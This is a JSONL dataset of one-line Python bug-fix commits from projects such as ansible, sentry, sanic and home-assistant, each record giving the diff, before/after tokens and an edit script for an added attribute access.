{"project": "quickrpc", "commit_sha": "208f607845e1b41a9f63a3ae42bfb08f2f6c0e0b", "parent_sha": "1f4b52a8ca0bd2e5c5e0db927027cbb54eda70aa", "file_path": "quickrpc/remote_api.py", "project_url": "https://github.com/loehnertj/quickrpc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -219,7 +219,7 @@ class RemoteAPI(object):\n             promise.set_result(reply.result)\n         else:\n             # Put the ErrorReply in the result queue.\n-            promise.set_exception(reply)\n+            promise.set_exception(reply.exception)\n \n     # ---- handling of outgoing messages ----\n \n", "before": "else : promise . set_exception ( reply )", "after": "else : promise . set_exception ( reply . exception )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 34, 3, 41], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:reply\", 3, 35, 3, 40], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:exception\", \"T\"], 2]]"}
{"project": "lifelines", "commit_sha": "1bc6c0f426afe55511911b1f8dee369bdb26d787", "parent_sha": "1579c6e8d5326098ce6d606ce7b94f147d967096", "file_path": "lifelines/tests/test_suite.py", "project_url": "https://github.com/christopherahern/lifelines", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -762,7 +762,7 @@ class CoxRegressionTests(unittest.TestCase):\n     def test_fit_method(self):\n         cf = CoxFitter(fit_intercept=False)\n         cf.fit(data_nus, duration_col='t', event_col='E')\n-        self.assertTrue( np.abs(cf.hazards_[0][0] - -0.0335) < 0.0001)\n+        self.assertTrue( np.abs(cf.hazards_.ix[0][0] - -0.0335) < 0.0001)\n \n \n \n", "before": "self . assertTrue ( np . abs ( cf . hazards_ [ 0 ] [ 0 ] - - 0.0335 ) < 0.0001 )", "after": "self . assertTrue ( np . abs ( cf . hazards_ . ix [ 0 ] [ 0 ] - - 0.0335 ) < 0.0001 )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 33, 3, 44], [\"attribute\", 3, 33, 3, 44], 0], [\"Insert\", [\"attribute\", 3, 33, 3, 44], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 33, 3, 44], [\"identifier:ix\", \"T\"], 2]]"}
{"project": "FastProject", "commit_sha": "47acee5a334ce00ae22efc33976c895cc5bbb699", "parent_sha": "62c8b811b84654cf933a55ae4b9f73b8db35abf0", "file_path": "FastProject/Transforms.py", "project_url": "https://github.com/juugii/FastProject", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -318,7 +318,7 @@ def correct_for_fn(prob, mu_h, fit_func, params, data):\n         out_prob = prob + (1-prob)*fn_prob;\n         weights = 1-fn_prob;\n     else:\n-        weights = _input_weights.loc[data.row_labels, data.col_labels]; # Use data to align\n+        weights = _input_weights.loc[data.row_labels, data.col_labels].values; # Use data to align\n         out_prob = prob + (1-prob)*(1-weights);\n \n     return out_prob, weights;\n", "before": "else : weights = _input_weights . loc [ data . row_labels , data . col_labels ]", "after": "else : weights = _input_weights . loc [ data . row_labels , data . col_labels ] . values", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"assignment\", 2, 5, 3, 71], [\"attribute\", \"N0\"], 4], [\"Move\", \"N0\", [\"subscript\", 3, 19, 3, 71], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:values\", \"T\"], 2]]"}
{"project": "FastProject", "commit_sha": "c2efa85b8271c1f567ed9f1501040c6559081eb4", "parent_sha": "db2865191e27a7b9f7982fd34659e769414f97e9", "file_path": "FastProject/DataTypes.py", "project_url": "https://github.com/juugii/FastProject", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -259,7 +259,7 @@ class ProbabilityData(np.ndarray):\n \n         data = self.base[ii,:];\n         sig_vector = sig_vector[ii,:];\n-        weights = np.ones(data);\n+        weights = np.ones(data.shape);\n \n         pdata = data * sig_vector * weights;\n         \n", "before": "weights = np . ones ( data )", "after": "weights = np . ones ( data . shape )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 32], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:data\", 3, 27, 3, 31], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:shape\", \"T\"], 2]]"}
{"project": "AmpliconPipeline", "commit_sha": "2dd7151a0d078959cfde0cad5216b8af4df02652", "parent_sha": "d6fd678d7ec9d684618a2bba8783889f5851356a", "file_path": "bin/qiime2_pipeline.py", "project_url": "https://github.com/forestdussault/AmpliconPipeline", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -311,7 +311,7 @@ def visualize_taxonomy(base_dir, metadata_object, taxonomy_analysis, dada2_filte\n     barplot_export_path = os.path.join(base_dir, 'taxonomy_barplot.qzv')\n \n     # Load metadata\n-    taxonomy_metadata = taxonomy_analysis.view(Metadata)\n+    taxonomy_metadata = taxonomy_analysis.classification.view(Metadata)\n \n     # Create taxonomy visualization\n     taxonomy_visualization = metadata.visualizers.tabulate(taxonomy_metadata)\n", "before": "taxonomy_metadata = taxonomy_analysis . view ( Metadata )", "after": "taxonomy_metadata = taxonomy_analysis . classification . view ( Metadata )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 25, 3, 47], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 25, 3, 47], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:taxonomy_analysis\", 3, 25, 3, 42], 0], [\"Move\", \"N0\", [\".:.\", 3, 42, 3, 43], 1], [\"Insert\", \"N0\", [\"identifier:classification\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "4cc06cca1c828a2e8104da944de7790b2645ef49", "parent_sha": "6f719ea848d117f6fca4f3ad255ec7df5962e1cc", "file_path": "lib/ansible/module_utils/network/iosxr/iosxr.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -383,7 +383,7 @@ def load_config(module, command_filter, warnings, replace=False, admin=False, co\n         diff = get_config_diff(module)\n         if module._diff:\n             if diff:\n-                module['diff'] = to_text(diff, errors='surrogate_or_strict')\n+                module._result['diff'] = to_text(diff, errors='surrogate_or_strict')\n         if commit:\n             commit_config(module, comment=comment)\n             conn.edit_config('end')\n", "before": "module [ 'diff' ] = to_text ( diff , errors = 'surrogate_or_strict' )", "after": "module . _result [ 'diff' ] = to_text ( diff , errors = 'surrogate_or_strict' )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"subscript\", 3, 17, 3, 31], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:module\", 3, 17, 3, 23], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:_result\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "6dfc82fe3e502f137d81d5001ec430f4d980f736", "parent_sha": "0214a8538235c42a3a77131b1d43643e571fca40", "file_path": "contrib/inventory/azure_rm.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -630,7 +630,7 @@ class AzureInventory(object):\n                     if machine.os_profile.windows_configuration.win_rm.listeners is not None:\n                         host_vars['windows_rm']['listeners'] = []\n                         for listener in machine.os_profile.windows_configuration.win_rm.listeners:\n-                            host_vars['windows_rm']['listeners'].append(dict(protocol=listener.protocol,\n+                            host_vars['windows_rm']['listeners'].append(dict(protocol=listener.protocol.name,\n                                                                              certificate_url=listener.certificate_url))\n \n             for interface in machine.network_profile.network_interfaces:\n", "before": "host_vars [ 'windows_rm' ] [ 'listeners' ] . append ( dict ( protocol = listener . protocol , certificate_url = listener . certificate_url ) )", "after": "host_vars [ 'windows_rm' ] [ 'listeners' ] . append ( dict ( protocol = listener . protocol . name , certificate_url = listener . certificate_url ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 87, 3, 104], [\"attribute\", 3, 87, 3, 104], 0], [\"Insert\", [\"attribute\", 3, 87, 3, 104], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 87, 3, 104], [\"identifier:name\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "0cecc08886e72e4f7fbcb715ada52833ecc40b9c", "parent_sha": "bcabbe33c83d93daec680fb760e65ed527e515cf", "file_path": "lib/ansible/modules/network/f5/bigip_device_trust.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -232,7 +232,7 @@ class ModuleManager(object):\n         if self.want.password:\n             return self.password\n         if self.want.provider.get('password', None):\n-            return self.provider.get('password')\n+            return self.want.provider.get('password')\n         if self.module.params.get('password', None):\n             return self.module.params.get('password')\n \n", "before": "return self . provider . get ( 'password' )", "after": "return self . want . provider . get ( 'password' )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 20, 3, 33], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 20, 3, 33], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 20, 3, 24], 0], [\"Move\", \"N0\", [\".:.\", 3, 24, 3, 25], 1], [\"Insert\", \"N0\", [\"identifier:want\", \"T\"], 2]]"}
{"project": "pritunl", "commit_sha": "1142c1a7c076795f99fec072ed82dfaca01115f4", "parent_sha": "a491bfb26bd49e70f8b84a02926b70d9ca20a80a", "file_path": "pritunl/handlers/settings.py", "project_url": "https://github.com/security-geeks/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -476,7 +476,7 @@ def settings_put():\n             changes.add('sso')\n         settings.app.sso_client_cache = sso_client_cache\n \n-    if flask.request.get('theme'):\n+    if flask.request.json.get('theme'):\n         settings_commit = True\n         theme = 'light' if flask.request.json['theme'] == 'light' else 'dark'\n \n", "before": "if flask . request . get ( 'theme' ) : settings_commit = True theme = 'light' if flask . request . json [ 'theme' ] == 'light' else 'dark'", "after": "if flask . request . json . get ( 'theme' ) : settings_commit = True theme = 'light' if flask . request . json [ 'theme' ] == 'light' else 'dark'", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 8, 3, 21], [\"attribute\", 3, 8, 3, 21], 0], [\"Insert\", [\"attribute\", 3, 8, 3, 21], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 8, 3, 21], [\"identifier:json\", \"T\"], 2]]"}
{"project": "sensor-control-center", "commit_sha": "36acc93239c9310856b7d89deea90e67d87823e4", "parent_sha": "6f750512fc2065fd21e3245aebfe56c601b98eb3", "file_path": "Sensor_config.py", "project_url": "https://github.com/chad-ermacora/sensor-control-center", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -105,7 +105,7 @@ def check_settings(config_settings):\n         logger.debug(\"Setting Graph Start Date Range - OK\")\n     else:\n         logger.error(\"Setting Graph Start Date Range - BAD - Using Default\")\n-        config_settings = default_settings\n+        config_settings = default_settings.graph_start\n \n     if len(config_settings.graph_end) == 19:\n         logger.debug(\"Setting Graph End Date Range - OK\")\n", "before": "config_settings = default_settings", "after": "config_settings = default_settings . graph_start", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 43], [\"attribute\", \"N0\"], 2], [\"Move\", \"N0\", [\"identifier:default_settings\", 3, 27, 3, 43], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:graph_start\", \"T\"], 2]]"}
{"project": "sensor-control-center", "commit_sha": "dd8834a9792b82c128ac93ac08e40d373ee9b4f6", "parent_sha": "36acc93239c9310856b7d89deea90e67d87823e4", "file_path": "Sensor_config.py", "project_url": "https://github.com/chad-ermacora/sensor-control-center", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -105,7 +105,7 @@ def check_settings(config_settings):\n         logger.debug(\"Setting Graph Start Date Range - OK\")\n     else:\n         logger.error(\"Setting Graph Start Date Range - BAD - Using Default\")\n-        config_settings = default_settings.graph_start\n+        config_settings.graph_start = default_settings.graph_start\n \n     if len(config_settings.graph_end) == 19:\n         logger.debug(\"Setting Graph End Date Range - OK\")\n", "before": "config_settings = default_settings . graph_start", "after": "config_settings . graph_start = default_settings . graph_start", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 55], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:config_settings\", 3, 9, 3, 24], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:graph_start\", \"T\"], 2]]"}
{"project": "mopidy", "commit_sha": "e981edc2ccbf2731774137bfba0fb465f58c86a3", "parent_sha": "acdfff5b61643ae62d5df2e141a7e6d6266bbd6f", "file_path": "mopidy/backends/__init__.py", "project_url": "https://github.com/atxwebs/mopidy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -119,7 +119,7 @@ class BasePlaybackController(object):\n         if self.current_track is None:\n             return None\n         try:\n-            return self.backend.current_playlist.playlist.index(\n+            return self.backend.current_playlist.playlist.tracks.index(\n                 self.current_track)\n         except ValueError:\n             return None\n", "before": "return self . backend . current_playlist . playlist . index ( self . current_track )", "after": "return self . backend . current_playlist . playlist . tracks . index ( self . current_track )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 20, 3, 58], [\"attribute\", 3, 20, 3, 58], 0], [\"Insert\", [\"attribute\", 3, 20, 3, 58], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 20, 3, 58], [\"identifier:tracks\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "721da4684266c2d523d312dd17ade420cceccfea", "parent_sha": "ef9238ab850617e40e0518e7b014d8883e137093", "file_path": "lib/ansible/plugins/callback/__init__.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -313,7 +313,7 @@ class CallbackBase:\n         self.playbook_on_no_hosts_remaining()\n \n     def v2_playbook_on_task_start(self, task, is_conditional):\n-        self.playbook_on_task_start(task, is_conditional)\n+        self.playbook_on_task_start(task.name, is_conditional)\n \n     def v2_playbook_on_cleanup_task_start(self, task):\n         pass #no v1 correspondance\n", "before": "self . playbook_on_task_start ( task , is_conditional )", "after": "self . playbook_on_task_start ( task . name , is_conditional )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 36, 3, 58], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:task\", 3, 37, 3, 41], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:name\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "b312a4354449ee50cb25b51fa9ada53fec6c980c", "parent_sha": "288446c9bfbd59f7b76c3327d8ca5724bc090199", "file_path": "lib/ansible/plugins/callback/mail.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -94,7 +94,7 @@ class CallbackModule(CallbackBase):\n             subject = res._result['stdout'].strip('\\r\\n').split('\\n')[-1]\n             body += 'with the following output in standard output:\\n\\n' + res._result['stdout'] + '\\n\\n'\n         if 'stderr' in res._result.keys() and res._result['stderr']:\n-            subject = res['stderr'].strip('\\r\\n').split('\\n')[-1]\n+            subject = res._result['stderr'].strip('\\r\\n').split('\\n')[-1]\n             body += 'with the following output in standard error:\\n\\n' + res._result['stderr'] + '\\n\\n'\n         if 'msg' in res._result.keys() and res._result['msg']:\n             subject = res._result['msg'].strip('\\r\\n').split('\\n')[0]\n", "before": "subject = res [ 'stderr' ] . strip ( '\\r\\n' ) . split ( '\\n' ) [ - 1 ]", "after": "subject = res . _result [ 'stderr' ] . strip ( '\\r\\n' ) . split ( '\\n' ) [ - 1 ]", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"subscript\", 3, 23, 3, 36], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:res\", 3, 23, 3, 26], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:_result\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "a87d30f72f3085743e79c8e09b350757ce9cd8fa", "parent_sha": "9cb0e771d267f603aeee5d99df9b6dca5e83b24a", "file_path": "lib/ansible/module_utils/eos.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -206,7 +206,7 @@ class Eapi(EosConfigMixin):\n         data = json.dumps(body)\n \n         headers = {'Content-Type': 'application/json-rpc'}\n-        timeout = self.url_args['timeout']\n+        timeout = self.url_args.params['timeout']\n \n         response, headers = fetch_url(\n             self.url_args, self.url, data=data, headers=headers,\n", "before": "timeout = self . url_args [ 'timeout' ]", "after": "timeout = self . url_args . params [ 'timeout' ]", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 19, 3, 32], [\"attribute\", 3, 19, 3, 32], 0], [\"Insert\", [\"attribute\", 3, 19, 3, 32], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 19, 3, 32], [\"identifier:params\", \"T\"], 2]]"}
{"project": "sanic", "commit_sha": "55778389057279734a88046e6e1cbebadfa79c85", "parent_sha": "7da4596ef89376e5cc26052e2ea81a4fce308545", "file_path": "tests/test_redirect.py", "project_url": "https://github.com/haoguangli/sanic", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,4 +88,4 @@ def test_chained_redirect(redirect_app):\n     assert request.url.endswith('/1')\n     assert response.status == 200\n     assert response.text == 'OK'\n-    assert response.url.endswith('/3')\n+    assert response.url.path.endswith('/3')\n", "before": "assert response . url . endswith ( '/3' )", "after": "assert response . url . path . endswith ( '/3' )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 12, 3, 24], [\"attribute\", 3, 12, 3, 24], 0], [\"Insert\", [\"attribute\", 3, 12, 3, 24], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 12, 3, 24], [\"identifier:path\", \"T\"], 2]]"}
{"project": "sentry", "commit_sha": "2ad349a890dd87ed5745cfc5879e92ddcd0dfee7", "parent_sha": "f9cbcdfdb52611f50b3adcde5a1373f10326a5c3", "file_path": "src/sentry/models/projectoption.py", "project_url": "https://github.com/noscripter/sentry", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -54,7 +54,7 @@ class ProjectOptionManager(BaseManager):\n \n     def unset_value(self, project, key):\n         self.filter(project=project, key=key).delete()\n-        self.reload_cache(project)\n+        self.reload_cache(project.id)\n \n     def set_value(self, project, key, value):\n         self.create_or_update(\n", "before": "self . reload_cache ( project )", "after": "self . reload_cache ( project . id )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 35], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:project\", 3, 27, 3, 34], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:id\", \"T\"], 2]]"}
{"project": "conda-smithy", "commit_sha": "3c9b36216c1f94da497b188f45dacfa25c2cb716", "parent_sha": "35c7cb6929f9d75caecc6c9e59d6b1d151935682", "file_path": "conda_smithy/github.py", "project_url": "https://github.com/isuruf/conda-smithy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -156,7 +156,7 @@ def accept_all_repository_invitations(gh):\n def remove_from_project(gh, org, project):\n     user = gh.get_user()\n     repo = gh.get_repo(\"{}/{}\".format(org, project))\n-    repo.remove_from_collaborators(user)\n+    repo.remove_from_collaborators(user.login)\n \n \n def configure_github_team(meta, gh_repo, org, feedstock_name):\n", "before": "repo . remove_from_collaborators ( user )", "after": "repo . remove_from_collaborators ( user . login )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 35, 3, 41], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:user\", 3, 36, 3, 40], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:login\", \"T\"], 2]]"}
{"project": "conda-smithy", "commit_sha": "e78897d96663198ff8181c3b068a7a3518bf662b", "parent_sha": "4ce995bd44014f78db90b05bba54ef93f27aef5a", "file_path": "conda_smithy/azure_ci_utils.py", "project_url": "https://github.com/isuruf/conda-smithy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -181,7 +181,7 @@ def register_repo(github_org, repo_name, project_id=AZURE_PROJECT_ID):\n         bclient.update_definition(\n             definition=build_definition,\n             definition_id=ed.id,\n-            project=ed.project,\n+            project=ed.project.name,\n         )\n     else:\n         bclient.create_definition(\n", "before": "bclient . update_definition ( definition = build_definition , definition_id = ed . id , project = ed . project , )", "after": "bclient . update_definition ( definition = build_definition , definition_id = ed . id , project = ed . project . name , )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 21, 3, 31], [\"attribute\", 3, 21, 3, 31], 0], [\"Insert\", [\"attribute\", 3, 21, 3, 31], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 21, 3, 31], [\"identifier:name\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "f3f3e3c66039cefae2c8cf932c859e6128fa5b0b", "parent_sha": "c0ebb74ad0ee2eb210266e3610e0b44474628872", "file_path": "lib/ansible/module_utils/ismount.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -70,7 +70,7 @@ def ismount(path):\n         return False\n     else:\n         # A symlink can never be a mount point\n-        if os.stat.S_ISLNK(s1.st_mode):\n+        if os.path.stat.S_ISLNK(s1.st_mode):\n             return False\n \n     parent = os.path.join(path, os.path.pardir)\n", "before": "else : if os . stat . S_ISLNK ( s1 . st_mode ) : return False", "after": "else : if os . path . stat . S_ISLNK ( s1 . st_mode ) : return False", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 12, 3, 19], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 12, 3, 19], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:os\", 3, 12, 3, 14], 0], [\"Move\", \"N0\", [\".:.\", 3, 14, 3, 15], 1], [\"Insert\", \"N0\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "bitbake", "commit_sha": "d000493c09ac5c1dcbab22d3a91296a9cb194ac0", "parent_sha": "a71183762e5d7d9f8153832efb9595e3a21d62f1", "file_path": "lib/bb/cache.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -179,7 +179,7 @@ class CoreRecipeInfo(RecipeInfoCommon):\n     def add_cacheData(self, cachedata, fn):\n         cachedata.task_deps[fn] = self.task_deps\n         cachedata.pkg_fn[fn] = self.pn\n-        cachedata.pkg_pn[self].append(fn)\n+        cachedata.pkg_pn[self.pn].append(fn)\n         cachedata.pkg_pepvpr[fn] = (self.pe, self.pv, self.pr)\n         cachedata.pkg_dp[fn] = self.defaultpref\n         cachedata.stamp[fn] = self.stamp\n", "before": "cachedata . pkg_pn [ self ] . append ( fn )", "after": "cachedata . pkg_pn [ self . pn ] . append ( fn )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"subscript\", 3, 9, 3, 31], [\"attribute\", \"N0\"], 2], [\"Move\", \"N0\", [\"identifier:self\", 3, 26, 3, 30], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:pn\", \"T\"], 2]]"}
{"project": "gnocis", "commit_sha": "c32101f724afd1110c4b5fb974030cd15c78b318", "parent_sha": "f8ba9c51c78a0d5234dbdab9a0b88eab87471fdc", "file_path": "gnocis/genome.py", "project_url": "https://github.com/bjornbredesen/gnocis", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ class gene:\n \t\treturn self.end+1-self.start\n \t\n \tdef __str__(self):\n-\t\trname = '%s (%s:%d..%d (%s))'%(self.name, self.rgn.seq, self.rgn.start, self.rgn.end, '+' if self.strand else '-')\n+\t\trname = '%s (%s:%d..%d (%s))'%(self.name, self.rgn.seq, self.rgn.start, self.rgn.end, '+' if self.rgn.strand else '-')\n \t\treturn 'Gene<%s>'%(rname)\n \t\n \tdef __repr__(self):\n", "before": "rname = '%s (%s:%d..%d (%s))' % ( self . name , self . rgn . seq , self . rgn . start , self . rgn . end , '+' if self . strand else '-' )", "after": "rname = '%s (%s:%d..%d (%s))' % ( self . name , self . rgn . seq , self . rgn . start , self . rgn . end , '+' if self . rgn . strand else '-' )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 96, 3, 107], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 96, 3, 107], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 96, 3, 100], 0], [\"Move\", \"N0\", [\".:.\", 3, 100, 3, 101], 1], [\"Insert\", \"N0\", [\"identifier:rgn\", \"T\"], 2]]"}
{"project": "bitbake", "commit_sha": "ff9f62fd5f76892ad41a5329b75472501e17e712", "parent_sha": "bdf437747b664479acde6deaa9096e2a6bcdf483", "file_path": "lib/bb/command.py", "project_url": "https://github.com/YoeDistro/bitbake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -387,7 +387,7 @@ class CommandsAsync:\n         prefiles = params[0]\n         postfiles = params[1]\n-        command.cooker.parseConfigurationFiles(prefiles, postfiles)\n+        command.cooker.databuilder.parseConfigurationFiles(prefiles, postfiles)\n         command.finishAsyncCommand()\n     parseConfigurationFiles.needcache = False\n \n", "before": "command . cooker . parseConfigurationFiles ( prefiles , postfiles )", "after": "command . cooker . databuilder . parseConfigurationFiles ( prefiles , postfiles )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 2, 9, 2, 23], [\"attribute\", 2, 9, 2, 23], 0], [\"Insert\", [\"attribute\", 2, 9, 2, 23], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 2, 9, 2, 23], [\"identifier:databuilder\", \"T\"], 2]]"}
{"project": "home-assistant", "commit_sha": "315e910bfe2d3ecdcf43bb9f2cb769e6de8d060f", "parent_sha": "a7523777ba61246e20bdc1ad9065415cf9ea9f13", "file_path": "homeassistant/components/history/__init__.py", "project_url": "https://github.com/THATDONFC/home-assistant", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -715,7 +715,7 @@ class LazyState(State):\n                 self._attributes = json.loads(self._row.attributes)\n             except ValueError:\n                 # When json.loads fails\n-                _LOGGER.exception(\"Error converting row to state: %s\", self)\n+                _LOGGER.exception(\"Error converting row to state: %s\", self._row)\n                 self._attributes = {}\n         return self._attributes\n \n", "before": "except ValueError : _LOGGER . exception ( \"Error converting row to state: %s\" , self )", "after": "except ValueError : _LOGGER . exception ( \"Error converting row to state: %s\" , self . _row )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 34, 3, 77], [\"attribute\", \"N0\"], 3], [\"Move\", \"N0\", [\"identifier:self\", 3, 72, 3, 76], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:_row\", \"T\"], 2]]"}
{"project": "configuration_draft", "commit_sha": "f8e80bcd8295dd3e230da5e6b7992e2a168b74bb", "parent_sha": "6b7c8015cdde9d5cb7b6dadf28133375bd330f21", "file_path": "bioimageio/spec/build_spec.py", "project_url": "https://github.com/bioimage-io/configuration_draft", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -23,7 +23,7 @@ def _get_local_path(uri, root=None):\n             is_local_path = True\n     if not is_local_path:\n         uri = spec.fields.URI().deserialize(uri)\n-        uri = spec.download_uri_to_local_path(uri).as_posix()\n+        uri = spec.shared.download_uri_to_local_path(uri).as_posix()\n     return uri\n \n \n", "before": "uri = spec . download_uri_to_local_path ( uri ) . as_posix ( )", "after": "uri = spec . shared . download_uri_to_local_path ( uri ) . as_posix ( )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 15, 3, 46], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 15, 3, 46], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:spec\", 3, 15, 3, 19], 0], [\"Move\", \"N0\", [\".:.\", 3, 19, 3, 20], 1], [\"Insert\", \"N0\", [\"identifier:shared\", \"T\"], 2]]"}
